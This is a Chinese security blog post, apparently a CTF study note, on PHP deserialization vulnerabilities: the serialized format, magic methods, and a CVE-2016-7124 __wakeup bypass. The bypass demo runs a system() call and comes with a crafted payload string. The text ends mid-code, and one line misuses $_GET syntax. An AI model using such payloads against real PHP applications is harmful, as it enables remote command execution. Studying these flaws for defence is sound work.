<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="序列化&amp;反序列化 因为数据存储的需要于是有了序列化和反序列化函数，类似还有json_encode,json_decode.PHP反序列化的方式很多，漏洞也很多，知识点也很多。于是我想结合CTF来学习PHP的反序列化漏洞，再深入到实战。     函数名 作用    Serialize 可以将数组或对象转换成字符串进行存储（有时候WAF改变了所存的储数据，则可能产生漏洞）   Unserial">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP-反序列化">
<meta property="og:url" content="http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Pan3a&#39;s Blog">
<meta property="og:description" content="序列化&amp;反序列化 因为数据存储的需要于是有了序列化和反序列化函数，类似还有json_encode,json_decode.PHP反序列化的方式很多，漏洞也很多，知识点也很多。于是我想结合CTF来学习PHP的反序列化漏洞，再深入到实战。     函数名 作用    Serialize 可以将数组或对象转换成字符串进行存储（有时候WAF改变了所存的储数据，则可能产生漏洞）   Unserial">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/jarvisoj.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/HexPhar.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/PharDemo.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181022222243-f07f25fe-d605-1.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/CurlReadFile.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/flag.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/soap.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/SetRedis.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/SoapRedis.png">
<meta property="og:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/RedisPanda.png">
<meta property="article:published_time" content="2021-04-10T04:13:36.000Z">
<meta property="article:modified_time" content="2021-04-30T12:09:33.373Z">
<meta property="article:author" content="Pan3a">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/jarvisoj.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/pan3a.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PHP-反序列化</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://www.github.com/Pan3a">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2021/04/28/ThinkPHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=PHP-反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=PHP-反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHP-反序列化&body=Check out this article: http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP-反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=PHP-反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/10/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=PHP-反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-amp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">序列化&amp;反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">PHP魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-Wakeup"><span class="toc-number">2.1.</span> <span class="toc-text">Bypass __Wakeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">PHP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz"><span class="toc-number">3.1.</span> <span class="toc-text">网鼎杯2020青龙组AreUSerialz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF-2020-Ezpop"><span class="toc-number">3.2.</span> <span class="toc-text">MRCTF 2020 Ezpop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">4.</span> <span class="toc-text">PHP反序列化字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E7%94%A8%E5%93%88%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%90%8D%E8%A8%80"><span class="toc-number">5.</span> <span class="toc-text">借用哈大佬们名言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF-2016piapiapia"><span class="toc-number">5.1.</span> <span class="toc-text">0CTF 2016piapiapia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%AF%A2%E6%9D%AF2019-easy-serialize-php"><span class="toc-number">5.2.</span> <span class="toc-text">安询杯2019-easy_serialize_php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">Session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E6%9E%90Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text">浅析Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-com"><span class="toc-number">6.2.</span> <span class="toc-text">jarvisoj.com</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.</span> <span class="toc-text">Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E6%9E%90Phar"><span class="toc-number">7.1.</span> <span class="toc-text">浅析Phar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo"><span class="toc-number">7.2.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NCTF2019-phar-matches-everything"><span class="toc-number">7.3.</span> <span class="toc-text">NCTF2019 phar matches everything</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">7.3.1.</span> <span class="toc-text">POC  文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-PHP-FPM"><span class="toc-number">7.3.2.</span> <span class="toc-text">SSRF PHP-FPM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">8.</span> <span class="toc-text">PHP 原生类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient-call"><span class="toc-number">8.1.</span> <span class="toc-text">SoapClient::__call</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Demo-1"><span class="toc-number">8.1.1.</span> <span class="toc-text">Demo</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        PHP-反序列化
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Pan3a</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-04-10T04:13:36.000Z" itemprop="datePublished">2021-04-10</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="序列化-amp-反序列化"><a href="#序列化-amp-反序列化" class="headerlink" title="序列化&amp;反序列化"></a>序列化&amp;反序列化</h2><ul>
<li>因为数据存储的需要于是有了序列化和反序列化函数，类似还有<code>json_encode</code>,<code>json_decode</code>.PHP反序列化的方式很多，漏洞也很多，知识点也很多。于是我想结合<code>CTF</code>来学习<code>PHP的反序列化漏洞</code>，再深入到实战。</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Serialize</td>
<td align="left">可以将数组或对象转换成字符串进行存储（有时候WAF改变了所存的储数据，则可能产生漏洞）</td>
</tr>
<tr>
<td align="center">Unserialize</td>
<td align="left">将序列化的字符串转换为PHP值（我们如果能控制反序列化时传输的数据，则可能产生漏洞）</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">basic</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;pan3a&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$gender</span> = <span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;one&#x27;</span>,<span class="string">&#x27;two&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> basic();</span><br><span class="line"><span class="variable">$ser</span> = serialize(<span class="variable">$object</span>);</span><br><span class="line">var_dump(<span class="variable">$ser</span>);</span><br><span class="line">print_r(unserialize(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>输出展示，<font color=red>类方法并没有参与序列化</font>这里的<code>\000</code>代表一个字符即<code>chr(0)</code>所展示的字符，由于不可见，经常使用<code>URL编码</code>来展示。</li>
<li><code>private</code>—<code>%00类名%00成员名</code></li>
<li><code>protected</code>—<code>%00*%00成员名</code></li>
<li>在<code>PHP7.1</code>后，对成员属性不敏感则可绕过对字符属性检测，同时也可以用大写<font color=red>S</font>,后面字符可用十六进制表示来绕过。可参考<code>网鼎杯2020青龙组AreUSerialz</code>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">133</span>) <span class="string">&quot;O:5:&quot;</span>basic<span class="string">&quot;:4:&#123;s:3:&quot;</span>age<span class="string">&quot;;i:18;s:11:&quot;</span>\<span class="number">000</span>basic\<span class="number">000</span>name<span class="string">&quot;;s:5:&quot;</span>pan3a<span class="string">&quot;;s:9:&quot;</span>\<span class="number">000</span>*\<span class="number">000</span>gender<span class="string">&quot;;s:3:&quot;</span>man<span class="string">&quot;;s:4:&quot;</span>data<span class="string">&quot;;a:2:&#123;i:0;s:3:&quot;</span>one<span class="string">&quot;;i:1;s:3:&quot;</span>two<span class="string">&quot;;&#125;&#125;&quot;</span></span><br><span class="line">basic <span class="keyword">Object</span></span><br><span class="line">(</span><br><span class="line">    [age] =&gt; <span class="number">18</span></span><br><span class="line">    [name:basic:<span class="keyword">private</span>] =&gt; pan3a</span><br><span class="line">    [gender:<span class="keyword">protected</span>] =&gt; man</span><br><span class="line">    [data] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; one</span><br><span class="line">            [<span class="number">1</span>] =&gt; two</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>这里反序列化的数据类型都是字符类型的缩写</li>
</ul>
<table>
<thead>
<tr>
<th>a - array</th>
<th>b - boolean</th>
<th>d - double</th>
<th>i - integer</th>
<th>o - common object</th>
<th>r - reference</th>
</tr>
</thead>
<tbody><tr>
<td>s - string</td>
<td>C - custom object</td>
<td>O - class</td>
<td>N - null</td>
<td>R - pointer reference</td>
<td>U - unicode string</td>
</tr>
</tbody></table>
<h2 id="PHP魔术方法"><a href="#PHP魔术方法" class="headerlink" title="PHP魔术方法"></a>PHP魔术方法</h2><ul>
<li>具体案例可参考—<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">十六个魔术方法详解</a>。</li>
<li>也可参考PHP手册—<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP Magic Method</a></li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">__construct</td>
<td align="left">类的构造函数，在类初始化时自动调用（类似于Python的_<em>init</em>_(self)）</td>
</tr>
<tr>
<td align="center">__destruct</td>
<td align="left">类的析构函数，PHP5引用，在类作用域结束时使用（通常用于反序列化利用链开始）</td>
</tr>
<tr>
<td align="center">__sleep</td>
<td align="left">执行serialize()函数之前执行该函数</td>
</tr>
<tr>
<td align="center">__wakeup</td>
<td align="left">执行unserialize()函数之前执行该函数(通常用于反序列化之前的初始化,<font color=red>CVE-2016-7124</font>可以Bypass此魔术方法)(<font color=green>PHP5-PHP5.6.25 AND PHP7-PHP7.0.10</font>)</td>
</tr>
<tr>
<td align="center">__tostring</td>
<td align="left">类被当做字符串时自动调用（比如输出语句，字符串拼接，字符比较等等）</td>
</tr>
<tr>
<td align="center">__invoke</td>
<td align="left">把类当做一个函数使用时调用</td>
</tr>
<tr>
<td align="center">__get</td>
<td align="left">访问不存在属性，或不可访问属性比如<code>protected</code></td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;forever404&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$gender</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>, <span class="variable">$name</span>, <span class="variable">$gender</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;gender = <span class="variable">$gender</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct自动调用啦！&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;My name is &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;,I am &#x27;</span>.<span class="variable">$age</span>.<span class="string">&#x27; Years old,&#x27;</span>.<span class="string">&#x27;I am a &#x27;</span>.<span class="variable">$gender</span>.<span class="string">&#x27;!&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;当前类的生命周期结束啦,__destruct析构函数被自动调用啦！&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用serialize()函数啦!&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;gender&#x27;</span>);</span><br><span class="line">        <span class="comment">// 必须返回父类中序列化元素属性,否则NULL被序列化会报错</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用unserialize()函数啦！&#x27;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;Panda&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;对象被当做字符串处理了！&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$O</span> = <span class="keyword">new</span> people(<span class="variable">$age</span>=<span class="string">&#x27;18&#x27;</span>,<span class="variable">$name</span>=<span class="string">&#x27;pan3a&#x27;</span>, <span class="variable">$gender</span>=<span class="string">&#x27;man&#x27;</span>);</span><br><span class="line"><span class="variable">$ser</span> = serialize(<span class="variable">$O</span>);</span><br><span class="line">var_dump(<span class="variable">$ser</span>);</span><br><span class="line">print_r(unserialize(<span class="variable">$ser</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;这是我的第一个类---&#x27;</span>.<span class="variable">$O</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>输出展示，会发现<code>name</code>,<code>gender</code>这两个序列化后的数据不一样，因为他们的属性分别是<code>private</code>，<code>protected</code>,这里还有就是<code>__destruct</code>这个魔术方法被调用了两次，因为有实例化结束调用一次，反序列化结束调用了一次。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__construct自动调用啦！My name is pan3a,I am <span class="number">18</span> Years old,I am a man!</span><br><span class="line">调用serialize()函数啦!</span><br><span class="line">/<span class="keyword">var</span>/www/html/MagicMethod/Deserialize.php:<span class="number">40</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">94</span>) <span class="string">&quot;O:6:&quot;</span>people<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:2:&quot;</span><span class="number">18</span><span class="string">&quot;;s:12:&quot;</span>\<span class="number">000</span>people\<span class="number">000</span>name<span class="string">&quot;;s:5:&quot;</span>pan3a<span class="string">&quot;;s:9:&quot;</span>\<span class="number">000</span>*\<span class="number">000</span>gender<span class="string">&quot;;s:3:&quot;</span>man<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">调用unserialize()函数啦！</span><br><span class="line">people <span class="keyword">Object</span></span><br><span class="line">(</span><br><span class="line">    [age] =&gt; <span class="number">100</span></span><br><span class="line">    [name:people:<span class="keyword">private</span>] =&gt; Panda</span><br><span class="line">    [gender:<span class="keyword">protected</span>] =&gt; man</span><br><span class="line">)</span><br><span class="line">当前类的生命周期结束啦,__destruct析构函数被自动调用啦！</span><br><span class="line">这是我的第一个类---对象被当做字符串处理了！</span><br><span class="line">当前类的生命周期结束啦,__destruct析构函数被自动调用啦！</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-Wakeup"><a href="#Bypass-Wakeup" class="headerlink" title="Bypass __Wakeup"></a>Bypass __Wakeup</h3><ul>
<li>这里就要用到上面提到的<font color=red><code>CVE-2016-7124</code></font>—反序列化中对象的个数大于真实个数及会绕过！</li>
<li>适用范围—<font color=green>PHP5-PHP5.6.25 AND PHP7-PHP7.0.10</font>。</li>
<li><a target="_blank" rel="noopener" href="https://www.dooccn.com/php5.4/">PHP Online Exec</a>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shell</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;command)) &#123;</span><br><span class="line">            system(<span class="keyword">$this</span>-&gt;command);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;var command is null&#x27;</span>.PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$MyShell</span> = <span class="keyword">new</span> shell();</span><br><span class="line"><span class="variable">$ser</span> = serialize(<span class="variable">$MyShell</span>);</span><br><span class="line">var_dump(<span class="variable">$ser</span>);</span><br><span class="line"><span class="comment">//    $ser = &#x27;O:5:&quot;shell&quot;:1:&#123;s:7:&quot;command&quot;;s:6:&quot;whoami&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">//$payload = &#x27;O:5:&quot;shell&quot;:2:&#123;s:7:&quot;command&quot;;s:3:&quot;pwd&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>(<span class="string">&#x27;payload&#x27;</span>))?serialize(<span class="variable">$ser</span>):<span class="variable">$_GET</span>(<span class="string">&#x27;payload&#x27;</span>);</span><br><span class="line"><span class="variable">$obj</span> = unserialize(<span 